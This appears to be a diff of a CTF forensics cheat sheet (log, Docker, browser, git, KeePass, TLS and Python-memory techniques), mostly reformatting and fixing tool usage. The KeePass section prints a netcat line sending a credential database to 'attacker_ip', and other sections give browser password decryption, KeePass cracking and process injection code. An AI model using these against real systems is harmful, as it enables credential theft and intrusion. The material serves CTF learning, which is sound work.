@@ -1,7 +1,6 @@
 # CTF Forensics - Linux and Application Forensics
 
 ## Table of Contents
-
 - [Log Analysis](#log-analysis)
 - [Linux Attack Chain Forensics](#linux-attack-chain-forensics)
 - [Docker Image Forensics (Pragyan 2026)](#docker-image-forensics-pragyan-2026)
@@ -23,7 +22,7 @@
 - [Ethereum / Blockchain Transaction Tracing (Defenit CTF 2020)](#ethereum--blockchain-transaction-tracing-defenit-ctf-2020)
 - [Python In-Memory Source Recovery via pyrasite (Insomni'hack 2017)](#python-in-memory-source-recovery-via-pyrasite-insomnihack-2017)
 
-------
+---
 
 ## Log Analysis
 
@@ -38,14 +37,13 @@ grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'
 sort logfile.log | uniq -c | sort -rn | head
 ```
 
-------
+---
 
 ## Linux Attack Chain Forensics
 
 **Pattern (Making the Naughty List):** Full attack timeline from logs + PCAP + malware.
 
 **Evidence sources:**
-
 ```bash
 # SSH session commands
 grep -A2 "session opened" /var/log/auth.log
@@ -62,7 +60,7 @@ tshark -r capture.pcap -Y "tftp" -T fields -e tftp.source_file
 
 **Common malware pattern:** AES-ECB encrypt + XOR with same key, save as .enc
 
-------
+---
 
 ## Docker Image Forensics (Pragyan 2026)
 
@@ -78,7 +76,6 @@ python3 -m json.tool blobs/sha256/<config_hash> | grep -A2 "created_by"
 ```
 
 **Analysis steps:**
-
 1. Extract the Docker image tar: `tar xf app.tar`
 2. Read `manifest.json` to find the config blob hash
 3. Parse the config blob JSON for `history[].created_by` entries
@@ -86,12 +83,11 @@ python3 -m json.tool blobs/sha256/<config_hash> | grep -A2 "created_by"
 5. Secrets echoed, written, or processed in any `RUN` command are preserved in the history
 6. Even if a later layer `rm -f secret.txt`, the `RUN echo "flag{...}" > secret.txt` remains visible
 
-------
+---
 
 ## Browser Credential Decryption
 
 **Chrome/Edge Login Data decryption (requires master_key.txt):**
-
 ```python
 from Crypto.Cipher import AES
 import sqlite3, json, base64
@@ -114,7 +110,6 @@ for url, user, encrypted_pw in cursor.fetchall():
 ```
 
 **Master key extraction from Local State:**
-
 ```python
 import json, base64
 with open('Local State', 'r') as f:
@@ -126,7 +121,7 @@ encrypted_key = encrypted_key[5:]
 # In CTF: master_key may be provided separately
 ```
 
-------
+---
 
 ## Firefox Browser History (places.sqlite)
 
@@ -142,14 +137,13 @@ sqlite3 places.sqlite "SELECT url FROM moz_places WHERE url LIKE '%flag%'"
 
 **Key tables:** `moz_places` (URLs), `moz_bookmarks`, `moz_cookies`
 
-------
+---
 
 ## USB Audio Extraction from PCAP
 
 **Pattern (Talk To Me):** USB isochronous transfers contain audio data.
 
 **Extraction workflow:**
-
 ```bash
 # Export ISO data with tshark
 tshark -r capture.pcap -T fields -e usb.iso.data > audio_data.txt
@@ -161,14 +155,13 @@ tshark -r capture.pcap -T fields -e usb.iso.data > audio_data.txt
 
 **Identification:** USB transfer type URB_ISOCHRONOUS = real-time audio/video
 
-------
+---
 
 ## TFTP Netascii Decoding
 
 **Problem:** TFTP netascii mode corrupts binary transfers; Wireshark doesn't auto-decode.
 
 **Fix exported files:**
-
 ```python
 # Replace netascii sequences:
 # 0d 0a → 0a (CRLF → LF)
@@ -180,14 +173,13 @@ with open('file_fixed', 'wb') as f:
     f.write(data)
 ```
 
-------
+---
 
 ## TLS Traffic Decryption via Weak RSA
 
 **Pattern (Tampered Seal):** TLS 1.2 with `TLS_RSA_WITH_AES_256_CBC_SHA` (no PFS).
 
 **Attack flow:**
-
 1. Extract server certificate from Server Hello packet (Export Packet Bytes -> `public.der`)
 2. Get modulus: `openssl x509 -in public.der -inform DER -noout -modulus`
 3. Factor weak modulus (dCode, factordb.com, yafu)
@@ -195,17 +187,15 @@ with open('file_fixed', 'wb') as f:
 5. Add to Wireshark: Edit -> Preferences -> TLS -> RSA keys list
 
 **After decryption:**
-
 - Follow TLS streams to see HTTP traffic
 - Export objects (File -> Export Objects -> HTTP)
 - Look for downloaded executables, API calls
 
-------
+---
 
 ## ROT18 Decoding
 
 ROT13 on letters + ROT5 on digits. Common final layer in multi-stage forensics:
-
 ```python
 def rot18(text):
     result = []
@@ -218,10 +208,9 @@ def rot18(text):
         else:
             result.append(c)
     return ''.join(result)
-
 ```
 
-------
+---
 
 ## Common Encodings
 
@@ -229,10 +218,9 @@ def rot18(text):
 echo "base64string" | base64 -d
 echo "hexstring" | xxd -r -p
 # ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
-
 ```
 
-------
+---
 
 ## Git Directory Recovery (UTCTF 2024)
 
@@ -243,46 +231,40 @@ gitdumper.sh https://target/.git/ /tmp/repo
 # Check reflog for old commits with secrets
 cat .git/logs/HEAD
 # Download objects from .git/objects/XX/YYYY, decompress with zlib
-
 ```
 
 **Tool:** `gitdumper.sh` from internetwache/GitTools is most reliable.
 
-------
+---
 
 ## KeePass Database Extraction and Cracking (H7CTF 2025)
 
 **Pattern (Moby Dock):** KeePass database (`.kdbx`) found on compromised system contains SSH keys or credentials for lateral movement.
 
 **Transfer from remote system:**
-
 ```bash
 # On target: base64 encode and send via netcat
 base64 .system.kdbx | nc attacker_ip 4444
 
 # On attacker: receive and decode
 nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
-
 ```
 
 **Cracking KeePass v4 databases:**
-
 ```bash
 # Standard keepass2john (KeePass v3 only)
 keepass2john system.kdbx > hash.txt
 
-# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
+# For KeePass v4 (KDBX 4.x with Argon2): use custom fork (no Makefile; Python and Perl scripts only)
 git clone https://github.com/ivanmrsulja/keepass2john.git
-cd keepass2john && make
-./keepass2john system.kdbx > hash.txt
+python3 keepass2john/keepass2john.py system.kdbx > hash.txt
+# Perl alternative: perl keepass2john/keepass2john.pl system.kdbx > hash.txt
 
 # Alternative: keepass4brute (direct brute-force)
 python3 keepass4brute.py -d wordlist.txt system.kdbx
-
 ```
 
 **Wordlist generation from challenge context:**
-
 ```bash
 # Generate wordlist from related website content
 cewl http://target:8080 -d 2 -m 5 -w cewl_words.txt
@@ -292,25 +274,22 @@ echo -e "expectopatronum\nharrypotter\nalohomora" >> cewl_words.txt
 
 # Crack with hashcat (Argon2 = mode 13400)
 hashcat -m 13400 hash.txt cewl_words.txt
-
 ```
 
 **After cracking — extract credentials:**
-
 1. Open `.kdbx` in KeePassXC with recovered password
 2. Check all entries for SSH private keys, passwords, API tokens
 3. SSH keys are typically stored in the "Notes" or "Advanced" attachment fields
 
 **Key insight:** Standard `keepass2john` does not support KeePass v4 (KDBX 4.x) databases that use Argon2 key derivation. Use the `ivanmrsulja/keepass2john` fork or `keepass4brute` for v4 support. Generate context-aware wordlists with `cewl` targeting related web services.
 
-------
+---
 
 ## Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)
 
 **Pattern (Poem About Pirates):** Git repository with clean history where data was overwritten and history rewritten via `git rebase --squash`. The original commits survive as orphaned objects.
 
 **Recovery steps:**
-
 ```bash
 # Check reflog for rebase/squash operations
 git reflog --all
@@ -324,14 +303,13 @@ git diff <commit-hash>^ <commit-hash>
 
 # Extract specific file version from orphaned commit
 git show <commit-hash>:path/to/file
-
 ```
 
 **Key insight:** `git rebase --squash` removes commits from the branch history but doesn't delete the underlying objects. They remain as unreachable objects until garbage collection runs (`git gc`). Even after `git gc`, objects younger than the expiry period (default 2 weeks) survive. Always check `git reflog` and `git fsck --unreachable` when investigating git repos for hidden data.
 
 **Detection:** Git repo with suspiciously clean history (single commit, or squash-merge commits). Challenge mentions "rewrite", "rebase", "squash", or "clean history".
 
-------
+---
 
 ## Browser Artifact Analysis
 
@@ -361,7 +339,6 @@ cat Bookmarks | python3 -m json.tool | grep -A2 '"url"'
 # Local Storage / IndexedDB — LevelDB format
 # Use leveldb-dump or strings on LevelDB files
 strings "Local Storage/leveldb/"*.ldb | grep -i flag
-
 ```
 
 ### Firefox
@@ -390,12 +367,11 @@ with open('sessionstore-backups/recovery.jsonlz4','rb') as f:
         for t in w['tabs']:
             print(t['entries'][-1]['url'])
 "
-
 ```
 
 **Key insight:** Browser artifacts are SQLite databases with non-standard timestamp formats. Chrome uses WebKit epoch (microseconds since 1601-01-01), Firefox uses Unix epoch in microseconds. Always check History, Cookies, Login Data, Local Storage, and session restore files. For encrypted passwords, you need the master key (DPAPI on Windows, keychain on macOS, key4.db on Firefox).
 
-------
+---
 
 ## Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)
 
@@ -429,11 +405,9 @@ def repair_blob(filepath, target_hash):
     with open(filepath, 'wb') as f:
         f.write(data)
     return False
-
 ```
 
 **Workflow:**
-
 1. `git fsck` to identify corrupted objects and their expected hashes
 2. Locate the corrupt blob files in `.git/objects/`
 3. Decompress with `python3 -c "import zlib; print(zlib.decompress(open('blob','rb').read()))"`
@@ -442,7 +416,7 @@ def repair_blob(filepath, target_hash):
 
 **Key insight:** Git's content-addressable storage means the expected SHA-1 hash is known from the commit tree, even when the blob is corrupted. Single-byte corruption is brute-forceable in seconds. For multi-byte corruption, combine with contextual knowledge (e.g., source code must compile, numeric constants must be valid).
 
-------
+---
 
 ## VBA Macro Forensics - Excel Cell Data to ELF Binary (Sharif CTF 2016)
 
@@ -455,14 +429,13 @@ with open('data.csv') as f, open('binary', 'wb') as out:
         for cell in row:
             if cell.strip():
                 out.write(bytes([int((int(cell) - 78) / 3)]))
-
 ```
 
 **Key insight:** Malware delivery via spreadsheet cell values with arithmetic transformation. Always reimplement VBA macro logic in Python rather than executing the macro. Check for `olevba` output to extract the transformation formula.
 
 **Detection:** Excel file with large numbers in cells, VBA macro with `CByte`/`Chr`/`Write` operations.
 
-------
+---
 
 ## Ethereum / Blockchain Transaction Tracing (Defenit CTF 2020)
 
@@ -503,12 +476,11 @@ def trace_ethereum_transactions(address, api_key, depth=3):
 # - Blockchair: multi-chain explorer (BTC, ETH, etc.)
 # - Chainalysis Reactor: commercial but referenced in CTFs
 # - breadcrumbs.app: free transaction visualization
-
 ```
 
 **Key insight:** Blockchain tumblers obscure transaction trails but leave statistical patterns. Track by correlating input/output amounts (minus fees), timing windows, and intermediate wallet transaction counts. Wallets with 10-50 transactions are likely intermediaries; 1000+ are exchanges/faucets to ignore.
 
-------
+---
 
 ## Python In-Memory Source Recovery via pyrasite (Insomni'hack 2017)
 
@@ -522,18 +494,19 @@ pgrep -f "python"
 pyrasite-shell <PID>
 
 # 3. Inside the pyrasite shell, enumerate and decompile functions:
+# uncompyle6.main exposes decompile()/decompile_file()/main() (no `uncompyle` entry point);
+# Py3 functions carry __code__, and uncompyle6 only supports <= 3.8 bytecode.
 import sys, uncompyle6
 # List all global variables and functions
-for name, obj in globals().items():
-    if hasattr(obj, 'func_code'):
+for name, obj in list(globals().items()):
+    if hasattr(obj, '__code__'):
         print(f"\n=== {name} ===")
-        uncompyle6.main.uncompyle(sys.version_info[0] + sys.version_info[1]/10.0,
-                                   obj.func_code, sys.stdout)
+        uncompyle6.main.decompile(obj.__code__, sys.version_info[:3], sys.stdout)
 
 # 4. Also check for variables containing secrets
 print(globals())  # May contain flags, keys, etc.
 ```
 
-**Key insight:** `pyrasite` injects a Python shell into a running process via `ptrace`. All code objects and global variables remain in memory even after the source file is deleted. `uncompyle6` decompiles `func_code` objects back to readable Python source. For Python 3.9+ processes, use [`pycdc`](https://github.com/zrax/pycdc) instead (`pycdc` operates on `.pyc` files — write code objects to disk with `marshal.dump` first).
+**Key insight:** `pyrasite` injects a Python shell into a running process via `ptrace`. All code objects and global variables remain in memory even after the source file is deleted. `uncompyle6` decompiles `__code__` objects back to readable Python source (call `uncompyle6.main.decompile(code_obj, sys.version_info[:3], out)`; `decompile(co, bytecode_version, out)` per 3.9.3 source). For Python 3.9+ processes, use [`pycdc`](https://github.com/zrax/pycdc) instead (`pycdc` operates on `.pyc` files — write code objects to disk with `marshal.dump` first).
 
 **Detection:** Challenge provides access to a running system where a Python process is active but the `.py` source file has been deleted. `ls -l /proc/<PID>/exe` shows the Python interpreter; `/proc/<PID>/fd/` may still reference the deleted file. Check `ptrace` permissions (`/proc/sys/kernel/yama/ptrace_scope`).
